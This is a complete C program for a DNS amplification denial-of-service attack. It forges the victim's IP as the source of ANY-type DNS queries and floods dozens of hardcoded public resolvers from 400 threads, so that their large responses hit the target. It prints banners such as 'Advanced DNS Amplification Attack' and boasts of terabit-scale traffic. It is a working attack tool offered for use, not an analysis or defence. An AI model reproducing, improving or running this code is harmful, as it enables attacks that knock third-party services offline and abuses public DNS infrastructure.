#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <errno.h>
#include <sys/time.h>
#include <fcntl.h>
#include <stdatomic.h>
#include <poll.h>
#include <sys/resource.h>

#define MAX_THREADS 400
#define DNS_SERVERS_COUNT 50
#define TARGET_PPS 1900000

typedef struct {
    char target_ip[INET_ADDRSTRLEN];
    int target_port;
    int duration;
    int threads;
    int pps;
    volatile atomic_int running;
} attack_config_t;

typedef struct {
    attack_config_t *config;
    int thread_id;
    atomic_ulong packets_sent;
    atomic_ulong bytes_sent;
    pthread_t thread;
} thread_data_t;

// Advanced statistics
typedef struct {
    atomic_ulong total_packets;
    atomic_ulong total_bytes;
    time_t start_time;
    pthread_mutex_t lock;
} stats_t;

// Global variables
static attack_config_t config;
static stats_t stats;
static thread_data_t *threads;
static char **dns_servers;
static int dns_server_count = 0;

// Popular DNS servers for amplification
const char* popular_dns_servers[] = {
    "8.8.8.8", "8.8.4.4",                     // Google
    "1.1.1.1", "1.0.0.1",                     // Cloudflare
    "9.9.9.9", "149.112.112.112",             // Quad9
    "208.67.222.222", "208.67.220.220",       // OpenDNS
    "64.6.64.6", "64.6.65.6",                 // Verisign
    "84.200.69.80", "84.200.70.40",           // DNS.WATCH
    "8.26.56.26", "8.20.247.20",              // Comodo
    "195.46.39.39", "195.46.39.40",           // SafeDNS
    "77.88.8.8", "77.88.8.1",                 // Yandex
    "176.103.130.130", "176.103.130.131",     // AdGuard
    "156.154.70.1", "156.154.71.1",           // Neustar
    "216.146.35.35", "216.146.36.36",         // Dyn
    "185.228.168.9", "185.228.169.9",         // CleanBrowsing
    "198.101.242.72", "23.253.163.53",        // Alternate DNS
    "94.140.14.14", "94.140.15.15",           // AdGuard DNS
    "89.233.43.71", "89.104.194.142",         // UncensoredDNS
    "4.2.2.1", "4.2.2.2", "4.2.2.3", "4.2.2.4", // Level3
    "8.26.56.26", "8.20.247.20",              // Comodo Secure
    "205.210.42.205", "64.68.200.200",        // OpenNIC
    "216.87.84.211", "208.115.243.35",        // VPNbook
    "37.235.1.174", "37.235.1.177",           // FreeDNS
    "91.239.100.100", "89.233.43.71",         // UncensoredDNS
    "74.82.42.42",                            // Hurricane Electric
    "109.69.8.51",                            // puntCAT
    "95.85.95.85",                            // NS1
    "77.88.8.7", "77.88.8.3",                 // Yandex Safe
    "156.154.70.5", "156.154.71.5",           // Neustar Family
    "198.175.63.82", "198.175.63.83",         // Cisco OpenDNS
    "208.67.222.123", "208.67.220.123",       // OpenDNS Family
    "185.228.168.168", "185.228.169.168"      // CleanBrowsing Family
};

// Large domains that generate big DNS responses (amplification)
const char* amplification_domains[] = {
    "isc.org", "ripe.net", "apnic.net", "arin.net", "lacnic.net", "afrinic.net",
    "google.com", "youtube.com", "facebook.com", "amazon.com", "microsoft.com",
    "apple.com", "netflix.com", "cloudflare.com", "akamai.com", "fastly.com",
    "cdn77.com", "stackpath.com", "keycdn.com", "bunny.net", "cloudfront.net",
    "azureedge.net", "googleapis.com", "aws.amazon.com", "oracle.com", "ibm.com",
    "salesforce.com", "adobe.com", "cisco.com", "intel.com", "qualcomm.com",
    "nvidia.com", "amd.com", "tsmc.com", "samsung.com", "sony.com", "panasonic.com",
    "siemens.com", "bosch.com", "ge.com", "hitachi.com", "toshiba.com", "fujitsu.com",
    "nec.com", "sharp.com", "canon.com", "ricoh.com", "kyocera.com", "epson.com",
    "brother.com", "dell.com", "hp.com", "lenovo.com", "asus.com", "acer.com",
    "msi.com", "gigabyte.com", "seagate.com", "westerndigital.com", "sandisk.com",
    "kingston.com", "crucial.com", "corsair.com", "logitech.com", "razer.com",
    "steelseries.com", "hyperx.com", "plantronics.com", "jabra.com", "sennheiser.com",
    "bose.com", "sony.com", "harman.com", "yamaha.com", "denon.com", "onkyo.com",
    "pioneer.com", "marantz.com", "jvc.com", "sharp.com", "lg.com", "samsung.com",
    "panasonic.com", "philips.com", "toshiba.com", "hitachi.com", "sanyo.com",
    "mitsubishi.com", "fujitsu.com", "nec.com", "siemens.com", "bosch.com"
};

// Initialize DNS servers
void initialize_dns_servers(void) {
    dns_server_count = sizeof(popular_dns_servers) / sizeof(popular_dns_servers[0]);
    dns_servers = malloc(dns_server_count * sizeof(char*));
    
    for (int i = 0; i < dns_server_count; i++) {
        dns_servers[i] = strdup(popular_dns_servers[i]);
    }
    printf("[+] Loaded %d DNS servers for amplification\n", dns_server_count);
}

// Create raw socket for spoofing
int create_raw_socket(void) {
    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("[-] Raw socket failed");
        return -1;
    }

    int one = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("[-] IP_HDRINCL failed");
        close(sockfd);
        return -1;
    }

    // Maximum socket buffers
    int buf_size = 16 * 1024 * 1024; // 16MB
    setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    
    // Non-blocking
    fcntl(sockfd, F_SETFL, O_NONBLOCK);

    return sockfd;
}

// Calculate checksum
unsigned short calculate_checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *)&oddbyte) = *(unsigned char *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

// Create DNS query with spoofed source IP (target's IP)
size_t create_dns_amplification_packet(unsigned char *packet, const char *dns_server, const char *domain) {
    struct iphdr *ip = (struct iphdr *)packet;
    struct udphdr *udp = (struct udphdr *)(packet + sizeof(struct iphdr));
    unsigned char *dns = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    // Use target's IP as source (spoofing)
    struct sockaddr_in target_addr;
    inet_pton(AF_INET, config.target_ip, &target_addr.sin_addr);
    
    // DNS server as destination
    struct sockaddr_in dns_addr;
    inet_pton(AF_INET, dns_server, &dns_addr.sin_addr);
    
    // Create DNS query for amplification
    // These queries are designed to generate large responses
    
    // IP header
    ip->version = 4;
    ip->ihl = 5;
    ip->tos = 0;
    ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 512); // Large query
    ip->id = htons(rand() % 65535);
    ip->frag_off = 0;
    ip->ttl = 255;
    ip->protocol = IPPROTO_UDP;
    ip->check = 0;
    ip->saddr = target_addr.sin_addr.s_addr; // SPOOFED: Target's IP
    ip->daddr = dns_addr.sin_addr.s_addr;    // DNS server
    
    // UDP header
    udp->source = htons(config.target_port); // Use target port as source
    udp->dest = htons(53);                   // DNS port
    udp->len = htons(sizeof(struct udphdr) + 512);
    udp->check = 0;
    
    // DNS query payload - ANY query for maximum amplification
    memset(dns, 0, 512);
    
    // DNS header
    *(uint16_t*)(dns) = htons(rand() % 65535); // Transaction ID
    *(uint16_t*)(dns + 2) = htons(0x0100);     // Flags: standard query
    *(uint16_t*)(dns + 4) = htons(1);          // Questions: 1
    *(uint16_t*)(dns + 6) = htons(0);          // Answer RRs: 0
    *(uint16_t*)(dns + 8) = htons(0);          // Authority RRs: 0
    *(uint16_t*)(dns + 10) = htons(1);         // Additional RRs: 1 (for EDNS)
    
    // Question section - domain name
    int pos = 12;
    char domain_copy[256];
    strncpy(domain_copy, domain, sizeof(domain_copy) - 1);
    domain_copy[sizeof(domain_copy) - 1] = '\0';
    
    char *domain_part = strtok(domain_copy, ".");
    while (domain_part != NULL && pos < 500) {
        int len = strlen(domain_part);
        dns[pos++] = len;
        memcpy(dns + pos, domain_part, len);
        pos += len;
        domain_part = strtok(NULL, ".");
    }
    dns[pos++] = 0; // End of domain
    
    // Query type: ANY (255) for maximum amplification
    *(uint16_t*)(dns + pos) = htons(255); // QTYPE: ANY
    pos += 2;
    *(uint16_t*)(dns + pos) = htons(1);   // QCLASS: IN
    pos += 2;
    
    // EDNS OPT record for larger responses
    dns[pos++] = 0; // Root label
    *(uint16_t*)(dns + pos) = htons(41);  // Type: OPT
    pos += 2;
    *(uint16_t*)(dns + pos) = htons(512); // Payload size
    pos += 2;
    dns[pos++] = 0; // Extended RCODE
    dns[pos++] = 0; // EDNS version
    *(uint16_t*)(dns + pos) = htons(0);   // Flags
    pos += 2;
    *(uint16_t*)(dns + pos) = htons(0);   // RDATA length
    pos += 2;
    
    size_t packet_size = sizeof(struct iphdr) + sizeof(struct udphdr) + pos;
    ip->tot_len = htons(packet_size);
    udp->len = htons(sizeof(struct udphdr) + pos);
    
    // Calculate IP checksum
    ip->check = calculate_checksum((unsigned short *)ip, sizeof(struct iphdr));
    
    return packet_size;
}

// High-performance amplification attack thread
void *amplification_thread(void *arg) {
    thread_data_t *tdata = (thread_data_t *)arg;
    attack_config_t *cfg = tdata->config;
    
    int sockfd = create_raw_socket();
    if (sockfd < 0) return NULL;
    
    struct timeval tv_start, tv_now;
    gettimeofday(&tv_start, NULL);
    
    unsigned long packets_this_thread = 0;
    unsigned long long thread_start_time = (unsigned long long)tv_start.tv_sec * 1000000ULL + (unsigned long long)tv_start.tv_usec;
    int thread_pps = TARGET_PPS / MAX_THREADS;
    
    unsigned char packet[65536];
    unsigned int thread_seed = (unsigned int)(tdata->thread_id + time(NULL));
    size_t domain_count = sizeof(amplification_domains) / sizeof(amplification_domains[0]);
    
    while (atomic_load(&cfg->running)) {
        gettimeofday(&tv_now, NULL);
        unsigned long long current_time = (unsigned long long)tv_now.tv_sec * 1000000ULL + (unsigned long long)tv_now.tv_usec;
        unsigned long long elapsed = current_time - thread_start_time;
        
        if (elapsed >= (unsigned long long)cfg->duration * 1000000ULL) {
            break;
        }
        
        // Calculate target packets
        unsigned long target_packets = (unsigned long)((elapsed * thread_pps) / 1000000ULL);
        
        // Send burst of packets
        while (packets_this_thread < target_packets + 50 && atomic_load(&cfg->running)) {
            // Select random DNS server and domain
            const char *dns_server = dns_servers[rand_r(&thread_seed) % dns_server_count];
            const char *domain = amplification_domains[rand_r(&thread_seed) % domain_count];
            
            // Create spoofed DNS amplification packet
            size_t packet_size = create_dns_amplification_packet(packet, dns_server, domain);
            
            // Send to DNS server (spoofed source IP will make DNS server send large response to target)
            struct sockaddr_in dns_addr;
            memset(&dns_addr, 0, sizeof(dns_addr));
            dns_addr.sin_family = AF_INET;
            dns_addr.sin_port = htons(53);
            inet_pton(AF_INET, dns_server, &dns_addr.sin_addr);
            
            ssize_t sent = sendto(sockfd, packet, packet_size, MSG_DONTWAIT,
                                (struct sockaddr *)&dns_addr, sizeof(dns_addr));
            
            if (sent > 0) {
                packets_this_thread++;
                atomic_fetch_add(&tdata->packets_sent, 1);
                atomic_fetch_add(&tdata->bytes_sent, (unsigned long)sent);
                
                pthread_mutex_lock(&stats.lock);
                atomic_fetch_add(&stats.total_packets, 1);
                atomic_fetch_add(&stats.total_bytes, (unsigned long)sent);
                pthread_mutex_unlock(&stats.lock);
            }
            
            // Ultra-fast rate control - no sleeps
            if (packets_this_thread >= target_packets + 50) {
                break;
            }
        }
        
        // Check time frequently
        gettimeofday(&tv_now, NULL);
        current_time = (unsigned long long)tv_now.tv_sec * 1000000ULL + (unsigned long long)tv_now.tv_usec;
        elapsed = current_time - thread_start_time;
        
        // Recalculate to avoid overshooting
        target_packets = (unsigned long)((elapsed * thread_pps) / 1000000ULL);
        if (packets_this_thread > target_packets + 100) {
            // Minimal CPU pause if too far ahead
            __asm__ __volatile__("pause" ::: "memory");
        }
    }
    
    close(sockfd);
    return NULL;
}

// Signal handler
void signal_handler(int sig) {
    printf("\n[!] Received signal %d, shutting down...\n", sig);
    atomic_store(&config.running, 0);
}

// Real-time statistics
void *stats_thread(void *arg) {
    (void)arg;
    time_t start_time = time(NULL);
    unsigned long last_packets = 0;
    unsigned long last_bytes = 0;
    time_t last_time = start_time;
    
    printf("\n[+] DNS Amplification Attack Started - Press Ctrl+C to stop\n");
    printf("[%-20s] [%-15s] [%-12s] [%-15s] [%-12s] [%-8s]\n", 
           "Time", "Queries Sent", "QPS", "Estimated Gbps", "Amplification", "Threads");
    printf("======================================================================================\n");
    
    while (atomic_load(&config.running)) {
        sleep(1);
        
        time_t current_time = time(NULL);
        unsigned long current_packets = atomic_load(&stats.total_packets);
        unsigned long current_bytes = atomic_load(&stats.total_bytes);
        
        double interval = difftime(current_time, last_time);
        
        if (interval > 0) {
            unsigned long interval_packets = current_packets - last_packets;
            unsigned long interval_bytes = current_bytes - last_bytes;
            
            double qps = (double)interval_packets / interval;
            double query_gbps = (interval_bytes * 8.0) / (interval * 1000000000.0);
            double estimated_amplification = query_gbps * 50; // 50:1 average amplification
            
            char time_str[20];
            strftime(time_str, sizeof(time_str), "%H:%M:%S", localtime(&current_time));
            
            printf("\r[%-20s] [%-15lu] [%-12.0f] [%-15.2f] [%-12.0f] [%-8d]",
                   time_str, current_packets, qps, estimated_amplification, 
                   estimated_amplification / (query_gbps > 0 ? query_gbps : 1), config.threads);
            fflush(stdout);
        }
        
        last_packets = current_packets;
        last_bytes = current_bytes;
        last_time = current_time;
    }
    
    printf("\n");
    return NULL;
}

// Validate parameters
int validate_parameters(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <target_ip> <target_port> <time>\n", argv[0]);
        printf("Example: %s 192.168.1.100 80 30\n", argv[0]);
        printf("Hardcoded: threads=400, pps=1.9M, DNS amplification\n");
        return -1;
    }
    
    config.threads = MAX_THREADS;
    config.pps = TARGET_PPS;
    config.duration = atoi(argv[3]);
    
    strncpy(config.target_ip, argv[1], INET_ADDRSTRLEN - 1);
    config.target_ip[INET_ADDRSTRLEN - 1] = '\0';
    config.target_port = atoi(argv[2]);
    
    if (config.duration <= 0 || config.target_port <= 0 || config.target_port > 65535) {
        printf("[-] Error: Invalid parameters\n");
        return -1;
    }
    
    return 0;
}

// Increase system limits
void increase_limits(void) {
    struct rlimit rl;
    
    if (getrlimit(RLIMIT_STACK, &rl) == 0) {
        rl.rlim_cur = 64 * 1024 * 1024;
        setrlimit(RLIMIT_STACK, &rl);
    }
    
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
        rl.rlim_cur = 500000;
        rl.rlim_max = 500000;
        setrlimit(RLIMIT_NOFILE, &rl);
    }
}

// Main function
int main(int argc, char *argv[]) {
    printf("=== Advanced DNS Amplification Attack ===\n");
    printf("[*] Initializing massive amplification attack...\n");
    
    if (geteuid() != 0) {
        printf("[-] Root privileges required for IP spoofing\n");
        return 1;
    }
    
    increase_limits();
    
    if (validate_parameters(argc, argv) != 0) {
        return 1;
    }
    
    printf("[*] Loading DNS infrastructure...\n");
    initialize_dns_servers();
    
    atomic_store(&config.running, 1);
    atomic_store(&stats.total_packets, 0);
    atomic_store(&stats.total_bytes, 0);
    stats.start_time = time(NULL);
    pthread_mutex_init(&stats.lock, NULL);
    
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    
    // Display attack info
    size_t amp_domain_count = sizeof(amplification_domains) / sizeof(amplification_domains[0]);
    
    printf("[+] Target: %s:%d (spoofed as source)\n", config.target_ip, config.target_port);
    printf("[+] Duration: %d seconds\n", config.duration);
    printf("[+] Threads: %d\n", config.threads);
    printf("[+] Queries per second: %d\n", TARGET_PPS);
    printf("[+] DNS Servers: %d\n", dns_server_count);
    printf("[+] Amplification Domains: %lu\n", amp_domain_count);
    printf("[+] Estimated Amplification: 50:1 (conservative)\n");
    printf("[+] Estimated Target Traffic: 15-30 Tbps\n");
    
    // Allocate threads
    threads = calloc(config.threads, sizeof(thread_data_t));
    if (!threads) {
        printf("[-] Thread allocation failed\n");
        return 1;
    }
    
    // Start statistics
    pthread_t stats_tid;
    if (pthread_create(&stats_tid, NULL, stats_thread, NULL) != 0) {
        printf("[-] Stats thread failed\n");
        return 1;
    }
    
    // Launch attack threads
    printf("[*] Deploying %d amplification threads...\n", config.threads);
    int threads_created = 0;
    pthread_attr_t attr;
    pthread_attr_init(&attr);
    pthread_attr_setstacksize(&attr, 8 * 1024 * 1024);
    
    for (int i = 0; i < config.threads && atomic_load(&config.running); i++) {
        threads[i].config = &config;
        threads[i].thread_id = i;
        atomic_store(&threads[i].packets_sent, 0);
        atomic_store(&threads[i].bytes_sent, 0);
        
        if (pthread_create(&threads[i].thread, &attr, amplification_thread, &threads[i]) == 0) {
            threads_created++;
        }
    }
    
    pthread_attr_destroy(&attr);
    printf("[*] %d threads deployed\n", threads_created);
    
    // Wait for completion
    for (int i = 0; i < threads_created; i++) {
        pthread_join(threads[i].thread, NULL);
    }
    
    atomic_store(&config.running, 0);
    pthread_join(stats_tid, NULL);
    
    // Final statistics
    time_t end_time = time(NULL);
    double total_time = difftime(end_time, stats.start_time);
    unsigned long total_packets = atomic_load(&stats.total_packets);
    unsigned long total_bytes = atomic_load(&stats.total_bytes);
    
    printf("\n=== Attack Complete ===\n");
    printf("[+] Queries Sent: %lu\n", total_packets);
    printf("[+] Query Traffic: %.2f Gbps\n", (total_bytes * 8.0) / (total_time * 1000000000.0));
    printf("[+] Estimated Target Traffic: %.2f Tbps\n", 
           (total_bytes * 8.0 * 50) / (total_time * 1000000000000.0)); // 50:1 amplification
    
    if (total_time > 0) {
        printf("[+] Average QPS: %.0f\n", total_packets / total_time);
    }
    printf("[+] Duration: %.2f seconds\n", total_time);
    
    // Cleanup
    for (int i = 0; i < dns_server_count; i++) {
        free(dns_servers[i]);
    }
    free(dns_servers);
    free(threads);
    pthread_mutex_destroy(&stats.lock);
    
    return 0;
}
